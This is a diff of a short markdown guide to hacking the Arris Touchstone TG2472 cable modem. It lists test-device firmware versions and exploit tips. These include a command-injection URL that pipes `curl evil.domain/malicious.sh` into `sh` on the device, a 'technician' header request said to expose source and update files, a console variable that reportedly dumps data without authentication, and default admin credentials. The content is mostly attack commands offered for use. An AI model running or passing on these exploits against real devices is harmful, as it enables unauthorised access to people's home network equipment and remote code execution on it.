@@ -1,9 +1,15 @@
 # How to hack your Arris Touchstone TG2472
 
+### Test device shite
+* HW_REV: 3
+* BOOTR: 4.2.0.45
+* SW_REV: 9.1.103BY.SIP
+
 ### General memes
-* `http://192.168.100.1:8080/router.html?wifi_ssids&curl evil.domain/malicious.sh | sh`. Runs in userland.
-* `curl -H "technician: true" http://192.168.100.1:8080/./`. Sources & discarded update files.
+* `http://192.168.100.1:8080/router.html?wifi_ssids&curl evil.domain/malicious.sh | sh` Runs in userland.
+* `curl -H "technician: true" http://192.168.100.1:8080/./` Sources & discarded update files.
 * `arTechnicianName` in the devtools console dumps loads of info, regardless of whether or not you're authenticated.
+* Default creds: `admin:password`
 
 ### Authenticationless access
 * *Only tested with default settings.*
